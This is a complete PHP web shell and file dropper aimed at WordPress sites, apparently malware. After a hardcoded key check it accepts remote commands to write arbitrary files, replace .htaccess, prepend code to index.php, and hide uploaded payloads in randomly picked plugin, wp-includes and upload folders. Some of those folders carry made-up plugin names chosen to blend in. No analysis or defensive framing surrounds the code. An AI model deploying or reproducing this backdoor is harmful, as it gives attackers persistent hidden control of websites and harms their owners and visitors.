<?php
error_reporting(0);
ignore_user_abort(true);

$path = __FILE__;
$dir = dirname($path);


$secret_key = "010203"; 
header('Content-Type: application/json');

if (isset($_POST['test']) && $_POST['test'] === '123') {
    echo 'success';
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(401);
    exit;
}

$input = file_get_contents('php://input');
$data = json_decode($input, true);

$root_path = get_site_path($dir);
$file_contents = isset($data['contents']) ? $data['contents'] : '';
$test_path = isset($data['path']) ? $data['path'] : '';


if ($data === null || empty($data['key']) || $data['key'] !== md5($secret_key)) {
    http_response_code(401);
    exit;
}

if (empty($data['module'])) {
    http_response_code(402);
    exit;
}

if (empty($data['contents']) || !is_array($data['contents'])) {
    http_response_code(403);
    exit;
}

if ($data['module'] == "user_generate"){
    $result = create_file($root_path, "/user_generate.php",$file_contents);
    echo $result; 
    exit;    
}

if ($data['module'] == "htaccess"){
    $result = create_file($root_path, "/.htaccess",$file_contents);
    echo $result; 
    exit;    
}


if ($data['module'] == "index"){
    $result = change_index($root_path,$file_contents);
    echo $result; 
    exit;    
}

if (in_array($data['module'], ["test1", "test2", "test3"])) {
    $result = create_file($root_path, $test_path,$file_contents);
    echo $result; 
    exit;    
}

if (in_array($data['module'], ["appendix1", "appendix2", "appendix3"])) {
    $result = create_file($root_path, $test_path,$file_contents,$data['module']);
    echo $result; 
    exit;    
}

if ($data['module'] == "code"){
    $result = uploads_code($root_path,$file_contents);
    echo $result; 
    exit;    
}

if ($data['module'] == "code_check"){

    $result = check_uploads($root_path,$file_contents);
    echo $result; 
    exit;    
}


function check_uploads($root_path, $contents){
    
    foreach ($contents as $path) {
        if (file_exists($path)) {
            $results[] = $path;
        }
    }
    return json_encode([
        'success' => true,
        'results' => $results
    ]);

}


function uploads_code($root_path , $contents){
    $path_folder = get_upload_folder($root_path);
    // $filtered = array_filter($path_folder, fn($v) => $v !== "");
    $filtered = array();
    foreach ($path_folder as $folder) {
        if ($folder !== "") {
            $filtered[] = $folder;
        }
    }
    shuffle($filtered);
    $result_folder = array_slice($filtered, 0, 3);
    $folder_count = count($result_folder);

    foreach ($contents as $i => $item) {
        $result = array();
        $current_folder = $result_folder[$i % $folder_count];
        $file_name = $contents[$i]['filename'];
        $result = create_file($current_folder, $file_name, $item); 
        $results[] = json_decode($result, true);  
    }
    return json_encode($results);
}


function get_site_path($dir) {

    $max_depth = 10; 
    $current = realpath($dir);

    while ($current && $max_depth-- > 0) {
        $wp_content = $current . DIRECTORY_SEPARATOR . 'wp-content';
        $wp_includes = $current . DIRECTORY_SEPARATOR . 'wp-includes';

        if (is_dir($wp_content) && is_dir($wp_includes)) {
            return $current;
        }
        $parent = dirname($current);
        if ($parent === $current) {
            break; 
        }
        $current = $parent;
    }
    return false;
}

function create_file($dir, $test_path ,$contents, $module_name="") {

    if (isset($contents[0]['content'])) {
         $content = $contents[0]['content']; 
         $file_name = $contents[0]['filename']; 
        }      
    elseif (isset($contents['content'])) { 
        $content = $contents['content']; 
        $file_name = $contents['filename']; 
    }
    
    if (in_array($module_name, ["appendix1", "appendix2", "appendix3"])){
        $full_path = rtrim($dir, '/\\') . DIRECTORY_SEPARATOR .rtrim(ltrim($test_path, '/\\'),'/\\').DIRECTORY_SEPARATOR.$file_name;
    }else{
        $full_path = rtrim($dir, '/\\') . DIRECTORY_SEPARATOR . ltrim($test_path, '/\\');
    }

    $dir = dirname($full_path);
    if (!is_dir($dir)) {
        if (!mkdir($dir, 0755, true)) {
            return json_encode([
                'success' => false,
                'message' => "folder failed: $dir"
            ]);
        }
    }

    // if (file_put_contents($full_path, $content) === false) {
    //         return json_encode([
    //             'success' => false,
    //             'message' => "$dir #file failed#: $full_path"
    //         ]);
    // }

    if (file_put_contents($full_path, $content) === false) {
        $error = error_get_last(); 
        return json_encode([
            'success' => false,
            'message' => "$dir #file failed#: $full_path",
            'error'   => $error ? $error['message'] : 'unknown error'
        ]);
    }

    return json_encode([
        'success' => true,
        'message' => $full_path
    ]);
}

function change_index($dir, $contents){

    $index_path = $dir."/index.php";
    $insert = !empty($contents) ? $contents[0]['content'] : '';
    
    $index_content = @file_get_contents($index_path);

    if ($index_content === false) {
        return json_encode([
            'success' => false,
            'message' => "can not read file: $index_path"
        ]);
    }

    $new_content = $insert . "\n" . $index_content;

    $a = @file_put_contents($index_path, $new_content);
    if ($a === false) {
        return json_encode([
            'success' => false,
            'message' => "can not access: $index_path"
        ]);
    }
    return json_encode([
        'success' => true,
        'message' => "file update: $index_path"
    ]);
}

function get_upload_folder($root_path){

    $suiji = ['simpleinjsandcss','wpfilemangersobject','defencecache','jetwooguard','whatsappchatbyninjas',
    'woopaypalplugins','wpcoreperformencepro','yithforyou','wpforms','wpmustmail'];

    $wpcontent_path = $root_path. DIRECTORY_SEPARATOR .'wp-content';
    $wpincludes_path = $root_path. DIRECTORY_SEPARATOR .'wp-includes';

    $create_plugins_path = $wpcontent_path.DIRECTORY_SEPARATOR.'plugins'.DIRECTORY_SEPARATOR.$suiji[array_rand($suiji)];
    $uploads_path = $wpcontent_path.DIRECTORY_SEPARATOR."uploads".DIRECTORY_SEPARATOR.date("Y").DIRECTORY_SEPARATOR.date("m");

    $rand_plugins_path = '';
    $rand_plugins_path = get_rand_folder($wpcontent_path.DIRECTORY_SEPARATOR.'plugins') ?: $rand_plugins_path;
    $include_deep = '';
    $include_deep = get_rand_folder($wpincludes_path) ?: $include_deep;
    $content_deep = '';
    $content_deep = get_rand_folder($wpcontent_path) ?: $content_deep;

    $random_upload_folder = array($uploads_path, $include_deep, $rand_plugins_path, $content_deep, $create_plugins_path);

    return $random_upload_folder;

}




function get_rand_folder($root, $max_depth = 5) {
    $current_path = rtrim($root, DIRECTORY_SEPARATOR);

    if (!is_dir($current_path)) return false;
    $forbidden = ['wp-admin', 'blocks', 'mu-plugins', 'rest-api', 'shortcodes', 'block-patterns', 'theme-compat', 'sitemaps', 'widgets'];
    for ($i = 0; $i < $max_depth; $i++) {
        // if (file_exists($current_path . DIRECTORY_SEPARATOR . '.htaccess')) {
        //     break;
        // }
        $items = @scandir($current_path);
        if ($items === false) break;
        $subfolders = [];
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            if (in_array($item, $forbidden)) continue;

            $path = $current_path . DIRECTORY_SEPARATOR . $item;
            if (is_dir($path)) $subfolders[] = $path;
        }

        if (empty($subfolders)) break;
        $current_path = $subfolders[array_rand($subfolders)];
    }
    return ($current_path === $root) ? false : $current_path;
}



